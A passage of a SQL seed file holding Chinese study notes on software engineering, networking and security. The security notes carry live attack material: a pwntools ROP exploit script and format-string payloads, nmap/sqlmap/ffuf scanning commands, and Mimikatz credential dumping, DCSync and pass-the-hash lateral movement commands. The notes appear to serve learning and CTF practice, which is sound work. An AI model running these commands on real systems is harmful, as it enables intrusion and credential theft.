    public void setPayment(Payment p) { this.p = p; }
    public void checkout(int a) { p.pay(a); }
}
```

## 四、SOLID 原则
- **S**：单一职责。
- **O**：开闭原则（扩展开放、修改关闭）。
- **L**：里氏替换（子类无破坏父类行为）。
- **I**：接口隔离（不强迫依赖无用方法）。
- **D**：依赖倒置（依赖抽象不依赖具体）。

## 五、系统设计要素
- **QPS/TPS**：每秒请求/事务数。
- **读写比**：决定主从架构。
- **数据规模**：决定分库分表。
- **一致性要求**：CP（强）还是 AP（最终）。

## 六、高并发三板斧
1. **缓存**：多级（本地 + Redis + CDN）。
2. **异步**：MQ 削峰填谷（Kafka/RocketMQ）。
3. **分片**：水平扩展（分库分表/无状态服务）。

## 七、典型架构演进
单机 → 主从 → 读写分离 → 垂直拆分 → 微服务 → 中台化 → 云原生

## 小结
设计模式解决"代码如何组织"，系统设计解决"服务如何扩展"；SOLID 是模式之魂，CAP 是分布式之纲。
$md$,
'软件工程', '设计模式与系统设计', array['设计模式','SOLID','系统设计','架构'], 'growing', '书籍笔记', 3),

('前端工程 Vue3 与工程化：Composition API 与 Vite', 'sw-frontend-vue3-engineering',
 'Vue3 Composition API + Vite + Pinia 是现代前端三件套。',
 $md$# 前端工程 Vue3 与工程化

## 一、Vue3 核心变化
- **Composition API**：`setup` 逻辑复用，替代 Options 混入混乱。
- **`<script setup>`**：语法糖，无需 return。
- **响应式重构**：Proxy 替代 Object.defineProperty，能监听新增属性。
- **Fragment**：多根节点。
- **TypeScript 友好**：defineProps/defineEmits 类型推导。

```vue
<script setup>
import { ref, computed, onMounted } from 'vue'
const count = ref(0)
const double = computed(() => count.value * 2)
function inc() { count.value++ }
onMounted(() => console.log('mounted'))
</script>

<template>
  <button @click="inc">{{ count }} ×2 = {{ double }}</button>
</template>
```

## 二、Vite 构建工具
- **dev**：原生 ESM + esbuild 依赖预构建，秒级冷启动。
- **build**：Rollup 打包，tree-shaking 友好。
- **优势**：HMR 极快，按需编译。

```js
// vite.config.js
import { defineConfig } from 'vite'
import vue from '@vitejs/plugin-vue'
export default defineConfig({
  plugins: [vue()],
  server: { proxy: { '/api': 'http://localhost:8080' } }
})
```

## 三、状态管理 Pinia
- 更简洁的 API：`defineStore` 返回 state/getters/actions。
- TypeScript 类型自动推导。
- 模块化无需 registerModule。

```js
export const useUserStore = defineStore('user', {
  state: () => ({ name: '', token: '' }),
  getters: { isLogin: s => !!s.token },
  actions: { login(t) { this.token = t } }
})
```

## 四、路由 Vue Router 4
```js
const routes = [{ path: '/', component: Home }]
const router = createRouter({ history: createWebHistory(), routes })
```

## 五、工程化要点
- **ESLint + Prettier**：代码规范与格式。
- **Husky + lint-staged**：提交前钩子。
- **Vitest**：Vite 原生测试。
- **unplugin-auto-import**：自动导入 API。
- **组件库**：Element Plus / Naive UI / Ant Design Vue。

## 六、性能优化
- **路由懒加载**：`() => import('...')`。
- **图片懒加载**：`loading="lazy"` + IntersectionObserver。
- **虚拟列表**：vue-virtual-scroller 处理 10w+ 行。
- **SSR/SSG**：Nuxt 提升首屏与 SEO。

## 小结
Vue3 + Vite + Pinia 是当下最佳搭配；用 `<script setup>` 写组件、用 Vite 加速开发、用 Pinia 管状态，上手即生产。
$md$,
'软件工程', '前端工程（Vue3/工程化）', array['Vue3','Vite','Pinia','Composition API'], 'growing', '实战总结', 3),

('后端工程与 API 设计：RESTful、GraphQL 与 RPC', 'sw-backend-api-design',
 '后端三件事：业务逻辑、数据持久、对外 API；RESTful 是默认、GraphQL 灵活、RPC 高效。',
 $md$# 后端工程与 API 设计

## 一、RESTful API 规范
- 资源用名词复数：`/users`、`/orders`。
- HTTP 方法对应动作：GET/POST/PUT/PATCH/DELETE。
- 状态码语义化：200/201/204/400/401/403/404/500。
- 版本化：URL 前缀 `/v1/` 或 Header `Accept: application/vnd.api.v1+json`。

```
GET    /v1/users          # 列表
POST   /v1/users          # 创建
GET    /v1/users/123      # 详情
PUT    /v1/users/123      # 全量更新
PATCH  /v1/users/123      # 局部更新
DELETE /v1/users/123      # 删除
```

## 二、接口设计要点
- **统一响应**：`{ code, message, data }`。
- **分页**：`?page=1&size=20` 或 cursor 游标（大数据量）。
- **过滤排序**：`?status=active&sort=-created`。
- **幂等性**：GET/PUT/DELETE 幂等，POST 不幂等（可加 idempotency-key）。

## 三、认证授权
- **Session**：服务端存储，cookie 携带 sessionId。
- **JWT**：无状态 token，签名 + payload + base64。
- **OAuth2**：四种授权模式（授权码、密码、客户端、隐式）。
- **API Key**：服务间调用，加 HMAC 签名。

## 四、GraphQL 对比
```graphql
query {
  user(id: "1") {
    name
    orders(last: 5) { total status }
  }
}
```
- 优势：按需取字段、避免 over-fetch。
- 劣势：缓存复杂（POST）、N+1 需 DataLoader 解决。

## 五、RPC 框架
- **gRPC**：Protobuf + HTTP/2，二进制小、多路复用。
- **Dubbo**：Java 生态，SPI 扩展丰富。
- **Thrift**：跨语言老牌。

```protobuf
syntax = "proto3";
service UserService {
  rpc GetUser(UserRequest) returns (UserReply);
}
```

## 六、API 网关职责
- 鉴权、限流、熔断、灰度、日志、协议转换。
- 代表：Spring Cloud Gateway、Kong、APISIX、Envoy。

## 七、接口文档
- **OpenAPI 3**：YAML 描述 + Swagger UI 渲染。
- **Postman/Apifox**：团队协作调试。
- **Mock**：开发期前后端并行。

## 小结
RESTful 是默认选项；GraphQL 解决数据获取灵活性问题；gRPC 解决内部服务高效通信；网关层统一治理 API。
$md$,
'软件工程', '后端工程与 API 设计', array['RESTful','GraphQL','gRPC','JWT'], 'growing', '实战总结', 3),

-- ============ 网络工程（6 条） ============

('路由与交换：静态/OSPF/BGP/VLAN', 'net-routing-switching-ospf-bgp',
 '园区网三层架构：接入-汇聚-核心；OSPF 内部、BGP 边界、VLAN 划分广播域。',
 $md$# 路由与交换

## 一、交换机基础
- **MAC 地址学习**：源 MAC 入 CAM 表，目标查表转发。
- **广播域**：泛洪帧只在同 VLAN 内。
- **STP**：阻断冗余链路防环，RSTP 加速收敛。
- **链路聚合 LACP**：多线捆绑，带宽叠加+冗余。

## 二、VLAN 与三层交换
- **802.1Q**：4 字节 tag，VLAN ID 12 位（1-4094）。
- **Access/Trunk/Hybrid**：接口模式不同，tag 处理规则不同。
- **SVI**：VLANIF 虚接口，三层交换机做网关。

```text
# Cisco 配置示例
vlan 10
name HR
interface gi0/1
 switchport mode access
 switchport access vlan 10
interface vlan 10
 ip address 192.168.10.1 255.255.255.0
```

## 三、OSPF
- **链路状态**：LSA 泛洪 → SPF 树 → 最短路径。
- **区域分层**：骨干 Area 0 + 非骨干，防 LSA 泛滥。
- **DR/BDR**：广播网选举，减少邻接关系。
- **cost**：参考带宽 100M，可调 `auto-cost reference-bandwidth`。

```text
router ospf 1
 router-id 1.1.1.1
 network 192.168.0.0 0.0.255.255 area 0
 network 10.0.0.0 0.0.0.255 area 1
```

## 四、BGP
- **AS 自治系统**：边界路由协议，路径矢量。
- **eBGP/iBGP**：跨 AS 用 eBGP，AS 内用 iBGP。
- **属性**：AS_PATH/LOCAL_PREF/MED/ORIGIN。
- **路由反射器 RR**：iBGP 全互联难扩展，RR 减少会话数。

## 五、静态路由
- 优点：简单可控、不耗 CPU。
- 缺点：不能自动绕行故障。
- 浮动静态：备份路由 + 更高 metric。

## 六、实战命令
```bash
# Cisco
show ip route                  # 路由表
show ip ospf neighbor          # 邻居
show ip bgp summary            # BGP 邻居状态
show interface gi0/1 status    # 端口状态
# Linux 做软路由
ip route add 0.0.0.0/0 via 192.168.1.1
sysctl -w net.ipv4.ip_forward=1
```

## 小结
二层看 STP/VLAN/链路聚合，三层看 OSPF/BGP；OSPF 适合企业内、BGP 主导互联网、VLAN 划分广播域。
$md$,
'网络工程', '路由与交换（静态/OSPF/BGP/VLAN）', array['OSPF','BGP','VLAN','交换'], 'growing', '课程笔记', 4),

('无线网络：Wi-Fi 与 5G', 'net-wireless-wifi-5g',
 'Wi-Fi 解决末端接入，5G 解决广域移动；两者都要懂射频与漫游。',
 $md$# 无线网络 Wi-Fi 与 5G

## 一、Wi-Fi 标准演进
| 标准 | 频段 | 带宽 | 速率 | 关键技术 |
|---|---|---|---|---|
| 802.11n | 2.4/5G | 40MHz | 600Mbps | MIMO |
| 802.11ac(WiFi5) | 5G | 160MHz | 3.5Gbps | MU-MIMO |
| 802.11ax(WiFi6) | 2.4/5G | 160MHz | 9.6Gbps | OFDMA |
| 802.11be(WiFi7) | 2.4/5/6G | 320MHz | 46Gbps | MLO |

## 二、Wi-Fi 关键概念
- **频段**：2.4G 穿墙好但拥堵（3 不重叠），5G 速度快但衰减大。
- **信道**：2.4G 1-13 中国允许，5G 36-64/100-144。
- **发射功率**：EIRP 限制（中国室内 ≤20dBm）。
- **漫游**：802.11k/v/r 协议族，AC/AP 控制器协调切换。

## 三、企业 Wi-Fi 部署
- **瘦 AP + AC**：统一管理、漫游、功率自动调整。
- **WPA3-Enterprise**：802.1X + RADIUS 鉴权。
- **Portal 认证**：访客网络，重定向登录页。

## 四、5G 网络架构
- **NSA/SA**：NSA 依托 4G 核心网，SA 独立 5G。
- **网络切片**：eMBB（大带宽）/ URLLC（低时延）/ mMTC（海量连接）。
- **gNB**：5G 基站，CU+DU+RU 三级架构。
- **核心网 5GC**：AMF/SMF/UPF 网元拆分。

## 五、5G 频段
- **Sub-6G**：n78(3.4-3.6GHz)、n41(2.5GHz)，覆盖广。
- **mmWave**：n257(26GHz)，速率高但覆盖差。

## 六、实战工具
```bash
# Linux 查看无线
iw dev                       # 接口与信道
iw list                      # 设备能力
iwconfig wlan0 essid "MyAP"
# 抓包 Wi-Fi
airodump-ng wlan0mon         # 监听模式扫描
```

## 七、排障要点
- **信号弱**：调整 AP 位置、加漫游引导、换 5G 信道。
- **掉线**：检查 DHCP、802.1X、漫游阈值。
- **速度慢**：测干扰(WiFi Analyzer)、避免 2.4G 拥堵、查 MIMO 退化。

## 小结
Wi-Fi 重末端覆盖与漫游，5G 重切片与低时延；企业级无线用 AC 统一管理，消费级靠 mesh 组网。
$md$,
'网络工程', '无线网络（Wi-Fi/5G）', array['Wi-Fi','5G','WiFi6','漫游'], 'seedling', '课程笔记', 3),

('防火墙与 NAT：iptables/nftables/状态检测', 'net-firewall-nat',
 '防火墙控制访问、NAT 缓解 IPv4 短缺，二者常共存在边界设备。',
 $md$# 防火墙与 NAT

## 一、防火墙分类
- **包过滤**：看五元组，无状态，速度快但弱。
- **状态检测**：跟踪连接状态，能识别回包。
- **应用层**：DPI 识别协议，可阻断 QQ/迅雷。
- **下一代 NGFW**：IDS/IPS/AV/URL 过滤一体。

## 二、iptables 五链四表
- **链**：PRROUTING / INPUT / FORWARD / OUTPUT / POSTROUTING。
- **表**：filter / nat / mangle / raw。
- **优先级**：raw → mangle → nat → filter。

```bash
# 允许已建立连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# 开放 22/80/443
iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT
# 默认拒绝
iptables -P INPUT DROP
# SNAT 出口伪装
iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE
# DNAT 端口转发
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to 10.0.0.2:80
```

## 三、nftables（iptables 接班）
- 语法统一、性能更好、原子化规则更新。
- 原生支持集合、字典、map。

```bash
nft add table inet mytable
nft add chain inet mytable input '{ type filter hook input priority 0; policy drop; }'
nft add rule inet mytable input tcp dport { 22, 80, 443 } accept
```

## 四、NAT 类型
| 类型 | 行为 | 典型 |
|---|---|---|
| SNAT | 改源 IP | 出口共享上网 |
| DNAT | 改目 IP | 端口映射到内网服务 |
| PAT  | SNAT+端口转换 | 家庭路由 MASQUERADE |
| Full Cone | 一对一映射 | 游戏友好 |
| Symmetric NAT | 每目标独立映射 | P2P 难穿透 |

## 五、NAT 穿透
- **STUN**：客户端发现自己的公网映射。
- **TURN**：中继转发，兜底方案。
- **ICE**：综合候选地址尝试。

## 六、Firewalld（CentOS/RHEL 默认）
```bash
firewall-cmd --add-service=http --permanent
firewall-cmd --add-port=8080/tcp --permanent
firewall-cmd --reload
firewall-cmd --list-all
```

## 七、排障技巧
- `iptables -L -n -v` 看命中计数。
- `conntrack -L` 看连接跟踪表。
- 抓包验证 NAT 转换前后差异：`tcpdump -i eth0 -nn host x.x.x.x`。

## 小结
Linux 防火墙选 nftables，企业选 NGFW；NAT 解决 IPv4 短缺，但破坏端到端，需 STUN/TURN 辅助 P2P。
$md$,
'网络工程', '防火墙与 NAT', array['iptables','nftables','NAT','防火墙'], 'growing', '实战总结', 3),

('VPN 与零信任组网：Tailscale 与 WireGuard', 'net-vpn-tailscale-wireguard',
 '传统 VPN 基于边界信任，零信任假设网络不可信；WireGuard 简洁、Tailscale 易用。',
 $md$# VPN 与零信任组网

## 一、传统 VPN
- **IPSec**：站点到站点，企业标准。
- **OpenVPN**：TLS 实现，跨平台。
- **SSL VPN**：浏览器接入，临时人员友好。
- 痛点：信任内网，一旦突破即横向移动。

## 二、零信任理念
- **从不信任、始终验证**：身份、设备、行为持续校验。
- **最小权限**：按角色/属性动态授权。
- **微分段**：每服务一堵墙，限制爆炸半径。
- **身份成为新边界**：取代网络位置。

## 三、WireGuard
- 协议极简（4000 行代码），椭圆曲线+ChaCha20+Poly1305。
- UDP 无连接，漫游自动切换 IP。
- 密钥对配置，无需证书链。

```ini
# /etc/wireguard/wg0.conf
[Interface]
PrivateKey = <server-private-key>
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <client-public-key>
AllowedIPs = 10.0.0.2/32
```

```bash
wg-quick up wg0
wg show                  # 查看握手状态
```

## 四、Tailscale（基于 WireGuard）
- 控制面托管，免自建 CA 与密钥交换。
- NAT 穿透：DERP 中继兜底，直连优先。
- ACL 策略：基于用户/标签的访问控制。
- MagicDNS：用主机名访问设备。

```bash
# 安装与登录
curl -fsSL https://tailscale.com/install.sh | sh
tailscale up --accept-routes --exit-node=<exit-node-ip>
tailscale status              # 查看节点
tailscale ping peer-host      # 测试直连
```

## 五、典型用法
- 远程办公：接入家庭/公司内网。
- 多云互联：跨云服务器组网。
- 子网路由：`--advertise-routes=192.168.1.0/24` 共享 LAN。
- Exit Node：所有流量走出口节点（家→公共 WiFi 加密）。

## 六、安全加固
- ACL 限制仅授权用户访问特定端口。
- 开启设备认证（Device Approval）。
- 定期轮换密钥。
- 审计日志接 SIEM。

## 小结
WireGuard 简洁高效，Tailscale 把它产品化；零信任让身份成为边界，是现代组网的安全基线。
$md$,
'网络工程', 'VPN 与零信任组网（Tailscale/WireGuard）', array['VPN','WireGuard','Tailscale','零信任'], 'growing', '实战总结', 3),

('SD-WAN 与网络自动化：Overlay 与 NetDevOps', 'net-sdwan-automation',
 'SD-WAN 解耦控制与转发、Overlay 隧道建网；网络自动化用 Ansible/Python 管设备。',
 $md$# SD-WAN 与网络自动化

## 一、SD-WAN 架构
- **Overlay**：在底层 IP 网之上用 IPsec/VXLAN 建隧道。
- **vEdge/vSmart**：数据面 + 控制面分离。
- **应用感知路由**：视频走低丢包、备份走低成本链路。
- **零接触部署 ZTP**：设备上电自动拉配置。

## 二、与传统专线对比
| 维度 | MPLS 专线 | SD-WAN |
|---|---|---|
| 部署 | 数周到数月 | 数天 |
| 成本 | 高 | 中低（混合宽带） |
| 带宽 | 固定 | 动态聚合 |
| 可视化 | 弱 | 强（应用级监控） |

## 三、主流厂商
- Cisco Viptela / Meraki
- 华为 NetEngine AR
- 深信服 SD-WAN
- 开源：OpenZiti、Tailscale（轻量替代）

## 四、网络自动化栈
- **Ansible**：YAML Playbook 推配置，幂等。
- **Nornir**：Python 多线程批量操作。
- **NetBox**：DCIM/IPAM 数据源。
- **Prometheus + Grafana**：监控可视化。

```yaml
# Ansible Cisco 示例
- hosts: switches
  gather_facts: no
  tasks:
    - name: 配置 VLAN
      cisco.ios.ios_vlans:
        config:
          - vlan_id: 10
            name: HR
```

## 五、API 驱动网络
- **RESTCONF/NETCONF**：标准化配置 API。
- **YANG 模型**：描述配置数据结构。
- **gNMI**：gRPC 网络管理，流式遥测。

```bash
# RESTCONF 示例
curl -X PATCH \
  -H 'Content-Type: application/yang-data+json' \
  -u admin:cisco \
  https://router/restconf/data/ietf-interfaces:interfaces/interface=Loopback0 \
  -d '{"interface":{"name":"Loopback0","type":"iana-if-type:softwareLoopback","enabled":true}}'
```

## 六、CI/CD 管网络
- Git 存配置版本（IaC 网络版）。
- PR Review + 自动 lint（Batfish 校验策略）。
- 灰度推送：先 1% 设备，验证后全量。
- 回滚：Git revert + 自动重推。

## 七、监控告警
- 流量：sFlow/NetFlow 采样。
- 性能：SNMP/Telemetry 流式推送。
- 拓扑自动发现：LLDP + 图数据库。

## 小结
SD-WAN 让 WAN 像 LAN 一样灵活；NetDevOps 让网络配置像代码一样管理；两者都让传统网络走向软件定义。
$md$,
'网络工程', 'SD-WAN 与网络自动化', array['SD-WAN','Ansible','NetDevOps','RESTCONF'], 'seedling', '课程笔记', 4),

('网络抓包与排障：Wireshark 与 tcpdump', 'net-capture-wireshark-tcpdump',
 '抓包是网络排障的"显微镜"：tcpdump 命令行快、Wireshark 图形化深。',
 $md$# 网络抓包与排障

## 一、tcpdump 速查
```bash
# 监听某接口
tcpdump -i eth0
# 指定端口与主机
tcpdump -i eth0 -nn 'port 80 and host 10.0.0.1'
# 抓完整包并写文件
tcpdump -i eth0 -w out.pcap -s 0 'tcp port 443'
# 过滤 SYN 包（三次握手第一步）
tcpdump -nn 'tcp[tcpflags] & tcp-syn != 0'
# 抓 DNS
tcpdump -nn 'udp port 53'
```

## 二、BPF 过滤语法
- 类型：`host`、`net`、`port`、`portrange`。
- 协议：`tcp`/`udp`/`icmp`/`arp`/`ip6`。
- 组合：`and`/`or`/`not`。
- 字段访问：`tcp[0:2] = 80` 表示 TCP 头前两字节等于 80。

## 三、Wireshark 进阶
- **显示过滤器**：`http.request.method == "POST"`、`tcp.analysis.flags`。
- **Follow TCP Stream**：重组完整会话，看明文协议。
- **统计 → 会话**：找出最活跃的对端。
- **专家信息**：自动标记重传、RST、乱序。
- **I/O 图表**：可视化时间序列。

## 四、典型排障流程
1. **慢**：抓包看 RTT、丢包、重传比例。
2. **连不上**：看 SYN 是否发出、有无 RST。
3. **断流**：看 keep-alive、TCP 窗口、MTU。
4. **HTTPS 证书错**：从 ClientHello 看支持的 cipher 与 SNI。

## 五、HTTPS 解密
- 用 SSLKEYLOGFILE 环境变量让 Chrome/Firefox 输出密钥。
- Wireshark → 编辑 → 首选项 → Protocols → TLS，导入 log 文件。
- 即可看到解密后的 HTTP 内容。

```bash
# Chrome 导出 TLS 密钥
google-chrome --ssl-key-log-file=~/sslkeys.log
# curl 也可
curl --ssl-key-log-file ~/sslkeys.log https://example.com
```

## 六、性能分析
- **RTT**：SYN→SYN-ACK 时间。
- **握手时延**：完整三次握手到首包。
- **TCP 窗口**：rwnd 限制吞吐，BBR 拥塞控制改善。
- **MTU/MSS**：路径 MTU 发现，避免分片。

## 七、自动化抓包
```bash
# 抓 100 个包后退出
tcpdump -i eth0 -c 100 -w cap.pcap
# 循环切片，每 100MB 滚动
tcpdump -i eth0 -w cap_%Y%m%d_%H.pcap -G 3600 -C 100
# 后台常驻 + 命中规则触发告警
```

## 小结
tcpdump 适合服务器快速取证，Wireshark 适合深度分析；用 BPF 过滤、用专家信息看异常、用 TLS key log 解密 HTTPS。
$md$,
'网络工程', '网络抓包与排障（Wireshark/tcpdump）', array['tcpdump','Wireshark','抓包','BPF'], 'growing', '实战总结', 3),

-- ============ 网络安全（7 条） ============

('Burp Suite 与常用工具：渗透测试工具箱', 'sec-burpsuite-tools',
 'Burp Suite 是 Web 渗透瑞士军刀，配合 Nmap/SQLmap/wfuzz 形成 Toolbox。',
 $md$# Burp Suite 与常用工具

## 一、Burp Suite 核心模块
- **Proxy**：拦截浏览器/APP 请求，可改包重发。
- **Repeater**：单包重放，调参试漏洞。
- **Intruder**：字典爆破，支持 4 种攻击模式（Sniper/Battering Ram/Pitchfork/Cluster Bomb）。
- **Decoder**：Base64/URL/Hex 互转。
- **Comparer**：两包差异对比。
- **Sequencer**：分析 token 随机性。
- **Extender**：BApp Store 安装插件（如 Autorize、JSON Beautifier）。

## 二、抓包配置
```
# 浏览器代理指向 127.0.0.1:8080
# 安装 Burp CA 证书到系统/浏览器根证书库
# 访问 http://burp 下载 cer
```

## 三、移动端抓包
- **安卓**：WiFi 高级代理 + 装 burp 证书（Android 7+ 需 magisk 模块或 frida bypass）。
- **iOS**：WiFi 代理 + 安装描述文件 + 信任根证书。
- **反证书绑定（SSL Pinning）**：Frida + objection 一键 bypass。

## 四、配合工具
| 工具 | 用途 |
|---|---|
| Nmap | 端口扫描、服务指纹、NSE 脚本 |
| Masscan | 大网段高速端口扫 |
| sqlmap | 自动化 SQL 注入 |
| wfuzz / ffuf | 目录爆破/参数 fuzz |
| Nikto | Web 服务器配置扫描 |
| Hydrus / ZAP | 自动化漏洞扫描 |

```bash
# Nmap 全套
nmap -sS -sV -O --script vuln,auth,banner -p- target.com
# sqlmap 一条命令
sqlmap -u 'http://x.com/?id=1' --batch --dbs
# 目录爆破
ffuf -u 'http://x.com/FUZZ' -w wordlist.txt -mc 200,302,401
```

## 五、Burp Intruder 实战
1. 标记 payload 位置：选中字段→Add §。
2. 选攻击模式（4 用户名 × 4 密码 → Cluster Bomb）。
3. 加载字典。
4. 看 Length/Status 区分有效响应。
5. Grep - Match 抽取关键字（如 "Welcome"）。

## 六、Burp 插件推荐
- **Logger++**：增强日志，支持导出与过滤。
- **Autorize**：自动测试越权。
- **Param Miner**：探测隐藏参数。
- **HTTP Request Smuggler**：检测请求走私。

## 七、合规使用
- 仅在授权范围内测试。
- Intruder 高并发会触发 WAF，注意分时分散。
- 抓包数据含敏感信息，注意脱敏与留存周期。

## 小结
Burp Suite 是 Web 渗透中枢；Nmap 扫端口、sqlmap 自动注入、ffuf 爆破、Frida 绕过；熟练组合提升效率 10 倍。
$md$,
'网络安全', 'Burp Suite 与常用工具', array['Burp','Nmap','sqlmap','工具箱'], 'growing', '实战总结', 3),

('逆向工程：汇编、IDA 与调试器', 'sec-reverse-engineering-ida',
 '逆向是从二进制还原设计与逻辑：汇编+IDA+动态调试是基本盘。',
 $md$# 逆向工程

## 一、必备基础
- **x86/x64 汇编**：寄存器、寻址方式、调用约定（cdecl/stdcall/fastcall）。
- **ARM 汇编**：R0-R15、Thumb、AAPCS。
- **PE/ELF/Mach-O**：可执行文件格式、节区、导入导出表。
- **ABI**：函数栈帧、参数传递、返回值。

## 二、静态分析工具
- **IDA Pro / Ghidra**：反汇编+反编译（F5 看伪 C）。
- **Binary Ninja**：现代 UI、IL 中间表达。
- **radare2**：命令行瑞士军刀。

## 三、关键分析步骤
1. 查壳（UPX/Themida）→ 脱壳。
2. 找 main（或 WinMain）：从入口点跟踪到用户代码。
3. 字符串/导入表定位关键函数。
4. 交叉引用追踪数据流。
5. 标记函数与变量、写注释。

```bash
# 命令行查字符串/符号
strings -a binary | grep -i 'password\|key\|debug'
objdump -d binary | head -100      # 反汇编
file binary                        # 文件类型
```

## 四、动态调试
- **GDB + pwndbg/gef**：Linux 用户态。
- **x64dbg/OllyDbg**：Windows 用户态。
- **WinDbg**：内核调试。
- **strace/ltrace**：系统调用与库调用追踪。

```bash
gdb ./binary
(gdb) start
(gdb) break *main
(gdb) info registers
(gdb) x/20xw $rsp       # 查看栈
(gdb) disas main
(gdb) set $eax = 0      # 改寄存器
```

## 五、常见技巧
- **反调试对抗**：IsDebuggerPresent、PEB、时间检测。
- **加密字符串**：定位解密函数，dump 明文。
- **VMP/混淆**：unicorn 模拟执行，trace 求路径。
- **Hook**：Detours、frida-trace。

## 六、实战流程
1. **CTF reverse 题**：找 flag 校验逻辑，写脚本反算。
2. **恶意代码分析**：沙箱 + IDA，定位 C2、加密算法、IOCs。
3. **漏洞研究**：找危险函数（strcpy/memcpy），回溯输入路径。

## 七、ARM 逆向要点
- ARM 指令定长 32 位，条件执行后缀（EQ/NE/CS）。
- LDR/STR 访存、LDM/STM 批量加载。
- BL 跳转并链接，LR 存返回地址。

## 八、推荐资源
- 《逆向工程核心原理》
- 《C++ 反汇编与逆向分析技术揭秘》
- pwn.college / crackmes.one

## 小结
逆向三件套：汇编基础 + 静态 IDA + 动态 GDB；先看字符串找线索，再交叉引用定位关键函数，动态调试验证假设。
$md$,
'网络安全', '逆向工程（汇编/IDA/调试器）', array['逆向','IDA','GDB','汇编'], 'seedling', '课程笔记', 5),

('二进制漏洞：栈溢出与堆利用', 'sec-binary-exploit-stack-heap',
 '栈溢出经典入门、堆利用进阶；现代缓解（NX/ASLR/Canary）催生 ROP 与 leak。',
 $md$# 二进制漏洞

## 一、内存布局
| 段 | 内容 |
|---|---|
| text | 代码，只读可执行 |
| rodata | 字符串常量 |
| data/bss | 全局变量 |
| heap | ↑ 向高地址生长 |
| stack | ↓ 向低地址生长 |

## 二、栈溢出
- 危险函数：`strcpy`、`gets`、`sprintf`、`scanf("%s")`。
- 利用：覆盖返回地址，跳到 shellcode 或 ROP。

```c
// 漏洞示例
void vuln() {
    char buf[64];
    gets(buf);            // 无边界检查
}
```

## 三、保护机制
| 机制 | 作用 | 绕过 |
|---|---|---|
| NX | 栈不可执行 | ROP 链 |
| Canary | 栈随机 cookie | leak + 覆盖 |
| ASLR | 地址随机化 | 信息泄露定基址 |
| PIE | 可执行文件随机化 | leak |
| RELRO | GOT 只读 | 改写 __malloc_hook 等 |

```bash
# 查看保护
checksec ./binary
# 输出示例
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

## 四、ROP 链
- 找 gadget：`pop rdi; ret` 这种短指令片段。
- 调用 `system("/bin/sh")`：传参 + 跳转。

```bash
# 找 gadget
ROPgadget --binary ./pwn | grep 'pop rdi'
# pwntools 自动构造
```

```python
from pwn import *
elf = ELF('./pwn')
io = process('./pwn')
pop_rdi = 0x401234        # gadget 地址
bin_sh  = next(elf.search(b'/bin/sh'))
ret     = 0x401016        # 对齐 ret
payload = b'A'*72 + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(elf.plt['system'])
io.sendline(payload)
io.interactive()
```

## 五、堆利用
- **glibc heap**：fastbin/unsorted bin/smallbin/largebin。
- **UAF**：释放后仍引用，可改 fd 指向任意地址。
- **double free**：fastbin 链表环，伪造 chunk。
- **tcache**（2.27+）：单链表，攻击更简单。
- **House of 系列**：The Force/Spirit/Lore/Orange/Einherjar。

## 六、格式化字符串漏洞
- `printf(user_input)` 直接用用户输入。
- `%n` 写内存、`%x` 泄露栈。

```bash
# 泄露栈
./pwn 'AAAA%p.%p.%p.%p'
# 写入
./pwn 'AAAA%8$n'   # 把 4 写到第 8 个参数指向的地址
```

## 七、学习路径
1. CTF pwn 入门：pwn.college、NPU。
2. pwndbg + pwntools + ROPgadget + one_gadget。
3. 经典书：《0day2》《程序员的自我修养》《CTF 特训营》。

## 小结
二进制漏洞从栈溢出入门，到 ROP 绕 NX，到堆利用打 glibc；现代缓解机制让攻击门槛提高，但 leak + ROP 依然能打。
$md$,
'网络安全', '二进制漏洞（栈溢出/堆利用）', array['栈溢出','ROP','堆利用','pwn'], 'seedling', '课程笔记', 5),

('内网渗透与横向移动', 'sec-intranet-pivot-lateral',
 '突破边界后在内网扩散：信息收集、提权、横向、维持。',
 $md$# 内网渗透与横向移动

## 一、内网渗透流程
1. **信息收集**：域信息、用户、主机、SPN、ACL。
2. **权限提升**：本地提权到 SYSTEM。
3. **凭据获取**：LSASS dump、SAM、ntds.dit。
4. **横向移动**：psexec/wmi/smbexec/mimikatz。
5. **维持持久**：黄金票据、SID History、骨架键。
6. **痕迹清理**：日志清理、清空 IE 缓存。

## 二、Windows 域信息收集
```powershell
# 域基础
net group "Domain Computers" /domain
net group "Domain Admins" /domain
nltest /domain_trusts
# BloodHound 一键拓扑
SharpHound.exe -c All
# PowerView 找高价值目标
Get-NetUser -SPN               # 找服务账户（Kerberoast 目标）
Get-ObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -match "S-1-5-21"} # ACL
```

## 三、提权方式
- **内核漏洞**：MS16-032/MS17-017 等，用 msfexploit/windows/local/。
- **服务权限**：服务路径未引用+空格→劫持。
- **计划任务**：以 SYSTEM 运行的任务，替换可执行文件。
- **AlwaysInstallElevated**：msi 包以 SYSTEM 安装。

```bash
# WinPEAS 自动检查
winPEASx64.exe
# PowerUp 检查
Invoke-AllChecks
```

## 四、凭据获取
```powershell
# Mimikatz dump LSASS
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam          # SAM
mimikatz # lsadump::dcsync /user:krbtgt   # DCSync 攻击
```

## 五、横向移动
| 方式 | 协议 | 前提 |
|---|---|---|
| PsExec | SMB | 管理员凭据 |
| WMI | DCOM | 凭据 |
| WinRM | HTTP 5985 | 凭据 |
| RDP | 3389 | 凭据 |
| Kerberoast | Kerberos | 普通用户 |
| Pass-the-Hash | NTLM | NTLM Hash |
| Pass-the-Ticket | Kerberos | 票据 |

```bash
# CrackMapExec 批量验证
crackmapexec smb 10.0.0.0/24 -u administrator -H <ntlm-hash>
# impacket psexec
python3 psexec.py Administrator@10.0.0.5 -hashes :<hash>
```

## 六、票据攻击
- **黄金票据**：用 krbtgt hash 伪造 TGT，可访问任意服务。
- **白银票据**：用服务账户 hash 伪造 ST，仅访问该服务。
- **Kerberoasting**：申请 ST 离线破解服务账户密码。
- **AS-REP Roasting**：开启 DONT_REQ_PREAUTH 的用户可离线破。

## 七、代理与跳板
- **frp/nps**：内网穿透回连。
- **chisel/ligolo**：多层代理。
